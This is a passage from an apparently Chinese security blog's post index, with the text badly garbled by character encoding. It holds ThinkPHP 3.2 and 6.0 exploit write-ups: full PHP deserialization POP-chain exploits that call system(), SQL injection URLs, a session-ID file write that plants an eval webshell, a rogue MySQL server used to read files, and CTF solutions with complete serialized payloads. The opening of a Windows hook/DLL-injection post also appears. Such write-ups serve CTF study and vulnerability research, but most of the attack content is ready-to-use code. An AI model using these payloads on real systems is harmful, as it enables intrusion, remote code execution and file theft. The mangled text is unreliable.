æ­¤$tableå¯æ§ï¼Œ$tableè¢«æ‹¼æ¥åˆ°$sqlï¼Œå†è¢«ä¼ å…¥$this-&gt;execute() 12$table=$this-&gt;parseTable($options['table']);$sql='DELETE FROM '.$table; æœ€ç»ˆæ‰§è¡Œ$this-&gt;execute($sql,!empty($options[â€˜fetch_sqlâ€™]) ? true : false); execute()æ–¹æ³•ä¸­è°ƒç”¨initConnect()æ–¹æ³•åˆå§‹åŒ–æ•°æ®åº“ åœ¨initConnect()æ–¹æ³•ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å±æ€§ï¼Œæ»¡è¶³æ¡ä»¶empty($this-&gt;config[â€˜deployâ€™])ï¼Œè°ƒç”¨connect()ã€‚ è¿™é‡Œæ–°å»ºäº†ä¸€ä¸ªPDOå¯¹è±¡ï¼Œä½¿ç”¨$this-&gt;configé‡Œçš„é…ç½®å»åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼Œç„¶åå»æ‰§è¡Œå‰é¢æ‹¼æ¥çš„DELETESQLè¯­å¥ã€‚ åˆ©ç”¨exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp3&quot;, &quot;hostname&quot; =&gt; &quot;192.168.111.129&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;&quot; ); }}namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-&gt;img = new Memcache(); } }}namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } }}namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-&gt;db = new Mysql(); $this-&gt;options['where'] = ''; $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); } }}namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));} åˆ©ç”¨LOAD DATA INFILEè¯»å–æ–‡ä»¶ï¼Œç”±äºmysqlå®¢æˆ·ç«¯ç»å¯¹ä¿¡ä»»æœåŠ¡ç«¯ã€‚å¯¼è‡´æ”»å‡»æœºå¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„æœåŠ¡ç«¯ï¼Œåœ¨è¿æ¥çš„æ—¶å€™å‘é€è¯»å–æ–‡ä»¶çš„è¯·æ±‚ï¼Œç„¶åè¿”å›çš„ç»“æœä¼šè¢«è®°å½•åˆ°mysql.log æ­å»ºmysqlæœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯è¿æ¥-&gt;å‘é€è¯»å–æ–‡ä»¶è¯·æ±‚-&gt;åœ¨mysql.logä¸­è¯»å–æ–‡ä»¶çš„å†…å®¹ https://github.com/allyshka/Rogue-MySql-Server/ ä¿®æ”¹ä¸ºè¦è¯»å–çš„æ–‡ä»¶ è¿è¡Œ è§¦å‘ååºåˆ—åŒ–ï¼Œè¿æ¥æ¶æ„æœåŠ¡ç«¯ åœ¨mysql.logä¸­æŸ¥çœ‹è¯»å–åˆ°çš„æ–‡ä»¶","link":"/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"},{"title":"ThinkPhp3.2.3æ³¨å…¥æ¼æ´æ€»ç»“","text":"ç¯å¢ƒé…ç½®æ•°æ®åº“è¿æ¥é…ç½® thinkphp3.2.3 whereæ³¨å…¥æ§åˆ¶å™¨ /Application/Home/Controller/IndexController.class.php payload 1http://localhost/tp3/?id[where]=1%20and%201=updatexml(1,concat(0x7e,(select database()),0x7e),1)# åˆ†æåœ¨I()æ–¹æ³•ä¸Šæ‰“ä¸€ä¸ªæ–­ç‚¹ï¼ŒI()æ–¹æ³•ç”¨æ¥è·å–GETå’ŒPOSTå‚æ•° åœ¨I()æ–¹æ³•ä¸­ç»è¿‡htmlspecialchars()å¤„ç†ï¼Œå†ç»è¿‡functions.phpä¸­think_filterå‡½æ•°è¿‡æ»¤ï¼Œè¿™ä¸¤å¤„è¿‡æ»¤å¯¹payloadæ²¡æœ‰å½±å“ï¼Œå¯ä»¥ç›´æ¥å¿½ç•¥ think_filterå‡½æ•° /ThinkPHP/Library/Think/Model.class.php æ¥ä¸‹æ¥è¿›å…¥find()æ–¹æ³•å¤„ç† å‚æ•°ç»è¿‡Model.class.phpä¸­çš„_parseOptions()æ–¹æ³•å¤„ç†åå¸¦å…¥selectæ–¹æ³•è¿›è¡ŒæŸ¥è¯¢ï¼Œå¯ä»¥çœ‹åˆ°æ³¨å…¥è¯­å¥åœ¨ç»è¿‡_parseOptions()åå°±å˜æˆäº†intç±»å‹ï¼Œåé¢çš„è¯­å¥è¢«å»é™¤äº†ã€‚ _parseOptionsæ‰§è¡Œå‰ï¼Œæ³¨å…¥è¯­å¥æ²¡æœ‰å‘ç”Ÿå˜åŒ– è·Ÿè¿›Â·_parseOptions()ï¼Œæ»¡è¶³æ¡ä»¶è¿›å…¥_parseType() åœ¨ç»è¿‡_parseTypeå¤„ç†åï¼Œæ³¨å…¥è¯­å¥è¢«è½¬æ¢æˆäº†intå‹ï¼Œåªä¿ç•™äº†å‰é¢çš„æ•°å­—,æ³¨æ„è¿™é‡Œçš„$options['where']æ˜¯ä¸€ä¸ªarray è·Ÿè¿›_parseType()ï¼Œå‘ç°è¿™é‡Œè¿›è¡Œäº†å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ŒæŠŠpayloadå¼ºåˆ¶è½¬æ¢æˆäº†intå‹ï¼Œå»æ‰äº†åé¢éƒ¨åˆ† ç»•è¿‡åªè¦is_array($options['where'])è¿™ä¸ªæ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±ä¸ä¼šè¿›å…¥åˆ°å¼ºåˆ¶è½¬æ¢å‡½æ•°ä¸­ï¼Œpayloadä¹Ÿå°±ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•è®©$options['where']ä¸ä¸ºæ•°ç»„ 1if(isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) å½“æˆ‘ä»¬ä¼ å…¥çš„payloadä¸º 1?id=45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# _parseOptionsæ‰§è¡Œå‰ï¼Œ$options['where']å°±æ˜¯ä¸€ä¸ªæ•°ç»„äº† find()å‡½æ•°å¼€å§‹å­˜åœ¨ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºæ•°å­—æˆ–è€…å­—ç¬¦ä¸²ï¼Œå°±ä¼šæŠŠä»–è½¬æ¢æˆæ•°ç»„å†èµ‹å€¼ç»™$options['where']ï¼Œè¿™æ ·å°±ä¼šæ»¡è¶³æ¡ä»¶is_array($options['where'])ä»è€Œå¯¼è‡´payloadè¢«è½¬æ¢ã€‚ è¿™é‡Œä¼ å…¥find()çš„å‚æ•°æ˜¯45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#ï¼Œæ»¡è¶³äº†ifåˆ¤æ–­ä¸­çš„æ¡ä»¶ï¼Œæ³¨å…¥å¤±è´¥ã€‚ å½“payloadä¸º 1?id[where]=45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# ifæ¡ä»¶ä¸æ»¡è¶³ options['where']å°±ä¼šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œis_array($options['where'])æ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±æˆåŠŸç»•è¿‡äº† æ³¨å…¥è¯­å¥æ²¡æœ‰è¢«è½¬æ¢ï¼Œç›´æ¥è¢«å¸¦å…¥æ‰§è¡Œã€‚ æ€»ç»“æ³¨å…¥äº§ç”Ÿçš„åŸå› æ˜¯æ„é€ çš„pocç»•è¿‡äº†thinkphpå¯¹$option['where']æ˜¯å¦æ˜¯ä¸€ä¸ªæ•°ç»„çš„åˆ¤æ–­ï¼Œä»è€Œä¸æ»¡è¶³is_array($options['where'])ï¼Œç»•è¿‡äº†_parseTypeå‡½æ•°è¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´äº†æ³¨å…¥ã€‚ Thinkphp 3.2.3 expæ³¨å…¥æ§åˆ¶å™¨ payload 1http://localhost/tp3/?username[0]=exp&amp;username[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) find()æ‰§è¡Œåˆ° 1$resultSet=$this-&gt;db-&gt;select($options); /ThinkPHP/Library/Think/Db/Driver.class.php è¿›å…¥select() è¿›å…¥buildSelectSql() è¿›å…¥parsesql()ï¼Œå…³æ³¨parseWhere()å‡½æ•° parseWhere()å‡½æ•°è°ƒç”¨parseWhereItem() elseifè¯­å¥ä¸­ç›´æ¥æ‹¼æ¥äº†whereæ¡ä»¶åˆ°sqlè¯­å¥ä¸­ï¼Œåˆ°è¾¾è¯¥è¯­å¥éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ 12if(is_array($val)) { if(is_string($val[0])) ç”±äº$exp=strtolower($val[0]);ï¼Œä¼ å…¥username[0]=exp&amp;username[1]=1 and 1=1 æ³¨æ„æ§åˆ¶å™¨é‚£é‡Œä¸èƒ½ä½¿ç”¨I()æ–¹æ³•æ¥è·å–å‚æ•°ï¼Œå› ä¸ºå‰é¢æåˆ°I()æ–¹æ³•ä¸­è°ƒç”¨äº†think_filter()å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¿‡æ»¤expï¼Œå¯¼è‡´æ³¨å…¥å¤±è´¥ thinkphp 3.2.3 bindæ³¨å…¥æ§åˆ¶å™¨ 12345678public function index(){ $User = M(&quot;Users&quot;); $user['id'] = I('id'); $data['password'] = I('password'); $valu = $User-&gt;where($user)-&gt;save($data); var_dump($valu);} payload 1http://localhost/tp3/?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1 è¿™é‡Œéœ€è¦æ³¨æ„id[1]=0åŸç†åœ¨ä¸‹é¢è¯´ save()å‡½æ•°ä¸­æ·»åŠ æ–­ç‚¹ /ThinkPHP/Library/Think/Db/Driver.class.php è¿›å…¥update() åˆç»è¿‡äº†parseWhere()å‡½æ•°ï¼Œé™¤äº†ä¹‹å‰åˆ©ç”¨çš„expè¿˜æœ‰bindå¯ä»¥åˆ©ç”¨ ç›´æ¥ä¼ é€’payloadï¼Œå‘ç°æ·»åŠ äº†å†’å·ï¼Œæ³¨å…¥å¤±è´¥ 1http://localhost/tp3/?id[0]=bind&amp;id[1]=1 å¯ä»¥çœ‹åˆ°bindParam()æ·»åŠ å†’å· ThinkPHP/Library/Think/Db/Driver.class.php execute()å°†:0æ›¿æ¢ä¸ºä¼ å…¥å‚æ•°ï¼Œè®©å‚æ•°ç­‰äº0ï¼Œç›¸å½“äº:0ï¼Œç„¶åè¢«æ›¿æ¢ä¸º1ï¼ŒæˆåŠŸæ³¨å…¥ 1234if(!empty($this-&gt;bind)){ $that = $this; $this-&gt;queryStr = strtr($this-&gt;queryStr,array_map(function($val) use($that){ return '\\''.$that-&gt;escapeString($val).'\\''; },$this-&gt;bind)); } å‚è€ƒhttps://www.cnblogs.com/-qing-/p/11444871.html https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/ https://syst1m.com/post/summary-of-thinkphp3-vulnerability/ https://www.chabug.org/audit/1062.html","link":"/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"title":"Thinkphp6.0.0-6.0.1 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´å¤ç°","text":"ç¯å¢ƒé…ç½®thinkphp6é»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯sessionåŠŸèƒ½çš„,éœ€è¦å–æ¶ˆapp\\middleware.phpæ–‡ä»¶ä¸­å¯¹sessionçš„æ³¨é‡Š ç”±äºé»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰åˆ›å»ºsessionï¼Œæ‰€éœ€è¦ä¿®æ”¹ä¸€ä¸‹æ§åˆ¶å™¨ï¼ŒåŠ ä¸Šåˆ›å»ºsessionçš„åŠŸèƒ½ã€‚ æ¼æ´åˆ©ç”¨ä¿®æ”¹cookieä¸ºPHPSESSID=aaaabbbbccccddddeeeeffff1234.phpï¼Œæ–‡ä»¶åé•¿åº¦å¿…é¡»ç­‰äº32ä½ å†™å…¥æˆåŠŸ 1http://localhost/tp6.0.0/runtime/session/sess_aaaabbbbccccddddeeeeffff1234.php å†™å…¥æ–‡ä»¶å†…å®¹ æ¼æ´åˆ†æä»»æ„æ–‡ä»¶å†™å…¥vendor/topthink/framework/src/think/session/Store.php è°ƒç”¨äº†write()æ–¹æ³•ï¼Œ$sessionIdç­‰äº$this-&gt;id vendor/topthink/framework/src/think/session/driver/File.php è·Ÿè¿›write()æ–¹æ³•ï¼Œå†™å…¥æ–‡ä»¶åä¸ºç»è¿‡getFileName()å¤„ç†çš„$sessIDï¼Œå†™å…¥æ–‡ä»¶å†…å®¹ä¸ºä¼ å…¥çš„å‚æ•°$sessData è·Ÿè¿›getFileName()ï¼Œæ–‡ä»¶åå®è´¨ä¸Šå°±ç­‰äºsess_æ‹¼æ¥ä¸Š$this-&gt;id writeFile()æ–¹æ³•è°ƒç”¨äº†file_put_contents()å†™å…¥æ–‡ä»¶ï¼Œå†™å…¥çš„æ–‡ä»¶åç­‰äºsess_æ‹¼æ¥ä¸Š$this-&gt;id æ¥ç€æŸ¥æ‰¾$this-&gt;idçš„æ¥æºï¼Œå½“ä¼ å…¥çš„å‚æ•°$idé•¿åº¦ç­‰äº32ä½æ—¶è¿”å›$this-&gt;idç­‰äº$idã€‚ vendor/topthink/framework/src/think/middleware/SessionInit.php è¿™é‡Œè°ƒç”¨äº†setId()æ–¹æ³•ï¼Œ$cookNameç­‰äºPHPSESIDï¼Œ $this-&gt;$id æœ€ç»ˆæ¥æºäºcookieä¸­çš„ PHPSESSID ã€‚è¿™æ ·å†™å…¥çš„æ–‡ä»¶åå°±å¯æ§äº†ã€‚æ–‡ä»¶å†…å®¹dataæ¥æºäºsessionçš„å†…å®¹ï¼Œéœ€è¦ä»£ç ä¸­å­˜åœ¨å¯ä»¥æ§åˆ¶sessionå†…å®¹çš„æ“ä½œï¼Œå¦‚Session::set('name',$_POST['c']);ï¼Œå°±å¯ä»¥å†™å…¥shellã€‚ vendor/topthink/framework/src/think/session/Store.php ä»»æ„æ–‡ä»¶åˆ é™¤vendor/topthink/framework/src/think/session/Store.php è¦è§¦å‘delete()æ–¹æ³•å¿…é¡»è¦ä½¿$this-&gt;dataä¸ºç©ºï¼Œå³sessionä¸­çš„å˜é‡é”®å€¼ä¸ºç©º vendor/topthink/framework/src/think/session/driver/File.php delete()æ–¹æ³•ä¸­çš„æ–‡ä»¶åæ‹¼æ¥ä¸Šäº†sess_ï¼Œæ–‡ä»¶åä¸å®Œå…¨å¯æ§ï¼Œåœ¨windowsä¸‹æ‰å¯ä»¥ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ç»•è¿‡é™åˆ¶åˆ é™¤ä»»æ„æ–‡ä»¶ã€‚ [GYCTF2020]EasyThinkingé€šè¿‡é”™è¯¯ä¿¡æ¯å¾—åˆ°thinkphpç‰ˆæœ¬ä¸º6.0.0 å­˜åœ¨www.zip \\app\\middleware.php sessionå¼€å¯ \\app\\home\\controller\\Member.php åœ¨searchæ§åˆ¶å™¨ä¸‹å‡ºç°äº†åˆ›å»ºsessionæ“ä½œï¼Œsessioné”®å€¼keyé€šè¿‡postä¼ å‚ï¼Œå†…å®¹å¯æ§ æ³¨å†Œä¸€ä¸ªç”¨æˆ· ç™»é™†ï¼Œä¿®æ”¹ä¿®æ”¹PHPSESSIDä¸ºaaaabbbbccccddddeeeeffff1234.php å†™å…¥shellï¼Œkey=&lt;?php eval($_POST[1]);?&gt; æˆåŠŸå†™å…¥ 1http://70366b0f-3c41-4ddb-8e92-2f4fae6b1b2e.node3.buuoj.cn/runtime/session/sess_aaaabbbbccccddddeeeeffff1234.php èšå‰‘è¿æ¥åå‘ç°flagä¸ºç©ºï¼Œæ ¹ç›®å½•å­˜åœ¨readflagæ–‡ä»¶ï¼Œéœ€è¦æ‰§è¡Œreadflag å‘ç°disable_functionè¿‡æ»¤å‘½ä»¤æ‰§è¡Œå‡½æ•° ä½¿ç”¨èšå‰‘ç»•è¿‡disable_functionæ’ä»¶è¯»å–flag å‚è€ƒ http://hed9eh0g.top/?p=280 https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/ https://paper.seebug.org/1114/ https://xz.aliyun.com/t/8546","link":"/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"Thinkphp6.0.xååºåˆ—åŒ–","text":"åˆ†æåˆ©ç”¨é“¾ 1234567891011121314think\\Model --&gt; __destruct()think\\Model --&gt; save()think\\Model --&gt; updateData()think\\Model --&gt; checkAllowFields()think\\Model --&gt; db()ååŠéƒ¨åˆ†åˆ©ç”¨é“¾ï¼ˆåŒtp 5.2ååŠéƒ¨åˆ†åˆ©ç”¨é“¾)think\\model\\concern\\Conversion --&gt; __toString()think\\model\\concern\\Conversion --&gt; __toJson()think\\model\\concern\\Conversion --&gt; __toArray()think\\model\\concern\\Attribute --&gt; getAttr()think\\model\\concern\\Attribute --&gt; getValue() vendor/topthink/think-orm/src/Model.php Modelç±»ä¸­å­˜åœ¨__destruct()æ–¹æ³•ï¼Œä»¤$this-&gt;lazySaveç­‰äºtrueï¼Œè°ƒç”¨save()ã€‚Modelç±»ä¸ºæŠ½è±¡ç±»ï¼Œåˆ©ç”¨çš„æ—¶å€™è¦ç”¨å®ƒçš„å­ç±»Pivot è·Ÿè¿›save()å‡½æ•°ï¼Œè§¦å‘ç‚¹ä½äºupdateDataå‡½æ•°å†…ï¼Œé¦–å…ˆéœ€è¦æ„é€ å‚æ•°é˜²æ­¢å‡½æ•°ç›´æ¥è¿”å›ï¼Œæ‰èƒ½è¿›å…¥updateData()å‡½æ•° éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½è¿›å…¥updateData()ï¼Œ 1.$this-&gt;existsä¸ºtrue 2.isEmpty()éœ€è¦è¿”å›falseï¼Œç»™$this-&gt;dataèµ‹å€¼å³å¯ 3.trigger()éœ€è¦è¿”å›trueï¼Œè®©$this-&gt;withEventç­‰äºfalse checkAllowFields()è§¦å‘__toString()ï¼Œéœ€è¦æ„é€ å‚æ•°é˜²æ­¢æå‰returnï¼Œç¬¬ä¸€ä¸ªifæ¡ä»¶å·²ç»æ»¡è¶³ã€‚ç¬¬äºŒä¸ªifï¼Œéœ€è¦empty($data)ç­‰äºfalse /vendor/topthink/think-orm/src/model/concern/Attribute.php è·Ÿè¿›getChangeData()æ–¹æ³•ï¼Œè®©$this-&gt;forceå’Œ$this-&gt;dataéƒ½æœ‰å€¼å°±å¯ä»¥ éœ€è¦å…ˆæ»¡è¶³$this-&gt;fieldä¸ºç©ºã€$this-&gt;schemaä¸ºç©ºä¸¤ä¸ªæ¡ä»¶æ‰èƒ½è°ƒç”¨$this-&gt;db() db()æ–¹æ³•ä¸­å‡ºç°äº†æ‹¼æ¥å­—ç¬¦ä¸²æ“ä½œï¼Œè§¦å‘__toString()ï¼Œéœ€è¦å…ˆè®©$this-&gt;connectionç­‰äºmysql æ¥ä¸‹æ¥å°±æ˜¯åŸæ¥tp5çš„__toStringåˆ©ç”¨é“¾ï¼Œç”±äºmodel\\concern\\Conversionæ˜¯ä¸€ä¸ªtraitå¤ç”¨ç±»ï¼Œæ‰€ä»¥åªè¦åœ¨Modelä¸‹useå³å¯ vendor/topthink/think-orm/src/model/concern/Conversion.php å­˜åœ¨__toString()æ–¹æ³•ï¼Œè°ƒç”¨toJson() è·Ÿè¿›toJson()ï¼Œè°ƒç”¨__toArray() toArray() vendor/topthink/think-orm/src/model/concern/Attribute.php getAttr()å‡½æ•°ï¼Œè°ƒç”¨getValue() getData() getRealFieldName()ï¼Œ$this-&gt;strictç­‰äºtrueè¿”å›$nameï¼Œè¿™æ ·getData()æ–¹æ³•å°±ä¼šè¿”å›$this-&gt;data[$name]ã€‚ getValue()å‡½æ•°ä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå½“$this-&gt;withAttr[$fieldName]ä¸ä¸ºæ•°ç»„çš„æ—¶å€™è§¦å‘ã€‚ åˆ©ç”¨exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [&quot;xxx&quot; =&gt; &quot;system&quot;]; public function get() { $this-&gt;data = [&quot;xxx&quot; =&gt; &quot;whoami&quot;]; } }}namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;field = []; $this-&gt;schema = []; $this-&gt;table = true; } }}namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj='') { //å®šä¹‰this-&gt;dataä¸ä¸ºç©º parent::__construct(); $this-&gt;get(); $this-&gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b));} æœ¬åœ°æµ‹è¯• [å®‰æ´µæ¯ 2019]iamthinkingå­˜åœ¨å¤‡ä»½æ–‡ä»¶www.zip æŸ¥çœ‹æºç å¾—åˆ°ç‰ˆæœ¬ä¸ºthinkphp6ï¼ŒæŸ¥çœ‹æ§åˆ¶å™¨ï¼Œå‘ç°å­˜åœ¨unserializeã€‚è¿‡æ»¤äº†Oå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ ¹æ®parse_urlçš„ç‰¹æ€§ç»•è¿‡ï¼Œåœ¨è§£æå½¢å¦‚http://xxx.com///index.php?payload=cmdè¿™æ ·çš„URIæ—¶parse_urlä¼šè¿”å›falseã€‚ åœ¨è§£æå½¢å¦‚http://xxx.com///index.php?payload=cmdè¿™æ ·çš„URIæ—¶parse_urlä¼šè¿”å›false exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [&quot;xxx&quot; =&gt; &quot;system&quot;]; public function get() { $this-&gt;data = [&quot;xxx&quot; =&gt; &quot;cat /flag&quot;]; } }}namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;field = []; $this-&gt;schema = []; $this-&gt;table = true; } }}namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj='') { //å®šä¹‰this-&gt;dataä¸ä¸ºç©º parent::__construct(); $this-&gt;get(); $this-&gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b));} åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¾—åˆ°flag 1http://c9c7cb46-f78b-4359-a3b6-7cfc292d6693.node3.buuoj.cn///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7D å‚è€ƒ https://www.cnblogs.com/20175211lyz/p/12203047.html https://forum.90sec.com/t/topic/1160","link":"/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Windowsé’©å­å‡½æ•°","text":"é’©å­åŸç†â€‹ Windowsä¸‹çš„åº”ç”¨ç¨‹åºå¤§éƒ¨åˆ†æ˜¯åŸºäºæ¶ˆæ¯æ¨¡å¼æœºåˆ¶çš„ï¼Œä¸€äº›CUIç¨‹åºä¸åŸºäºæ¶ˆæ¯ã€‚Windowsä¸‹åº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ªæ¶ˆæ¯å‡½æ•°ï¼Œæ ¹æ®ä¸åŒçš„æ¶ˆæ¯æ¥å®Œæˆä¸åŒçš„åŠŸèƒ½ã€‚Windowsæä¾›çš„é’©å­æœºåˆ¶æ˜¯ç”¨æ¥æˆªè·ç›‘è§†ç³»ç»Ÿä¸­çš„æ¶ˆæ¯ã€‚ä¸åŒçš„é’©å­å¯ä»¥å¤„ç†ä¸åŒä¿¡æ¯ã€‚ â€‹ é’©å­åˆ†ä¸ºå±€éƒ¨é’©å­å’Œå…¨å±€é’©å­ã€‚å±€éƒ¨é’©å­æ˜¯é’ˆå¯¹ä¸€ä¸ªçº¿ç¨‹çš„ï¼Œè€Œå…¨å±€é’©å­æ˜¯é’ˆå¯¹æ•´ä¸ªæ“ä½œç³»ç»Ÿå†…åŸºäºæ¶ˆæ¯æœºåˆ¶çš„åº”ç”¨ç¨‹åºçš„ã€‚å…¨å±€é’©å­éœ€è¦ä½¿ç”¨DLLæ–‡ä»¶ï¼ŒDLLæ–‡ä»¶é‡Œå­˜æ”¾äº†é’©å­å‡½æ•°çš„ä»£ç ã€‚ â€‹ å®‰è£…å…¨å±€é’©å­åï¼Œåªè¦è¿›ç¨‹æ¥æ”¶åˆ°å¯ä»¥å‘å‡ºé’©å­çš„æ¶ˆæ¯åï¼Œå…¨å±€é’©å­çš„DLLæ–‡ä»¶ä¼šè¢«æ“ä½œç³»ç»Ÿè‡ªåŠ¨æˆ–å¼ºè¡Œçš„åŠ è½½åˆ°è¯¥è¿›ç¨‹ä¸­ã€‚ç”±æ­¤å¯è§ï¼Œè®¾ç½®æ¶ˆæ¯é’©å­ä¹Ÿæ˜¯ä¸€ç§å¯ä»¥è¿›è¡ŒDLLæ³¨å…¥çš„æ–¹æ³•ã€‚ é’©å­å‡½æ•°é’©å­å‡½æ•°åœ¨ç³»ç»Ÿæ¶ˆæ¯è§¦å‘æ—¶è¢«ç³»ç»Ÿè°ƒç”¨ ã€‚åœ¨æŸä¸ªäº‹ä»¶è§¦å‘åï¼Œé’©å­å‡½æ•°æ•è·å®ƒå¹¶å®Œæˆä¸€äº›æ“ä½œï¼Œæ˜¯ä¸€æ®µç”¨ä»¥å¤„ç†ç³»ç»Ÿæ¶ˆæ¯çš„ç¨‹åº ç›¸å…³APIå‡½æ•°123456LRESULT CALLBACK HookProc //æ‰€æœ‰çš„é’©å­å‡½æ•°éƒ½æ˜¯è¿™ç§å½¢å¼( int nCode, WPARAM wParam, LPARAM lParam,); å‚æ•°nCodeï¼šé’©å­ä»£ç ï¼Œé’©å­å­ç¨‹é€šè¿‡è¯¥ä»£ç 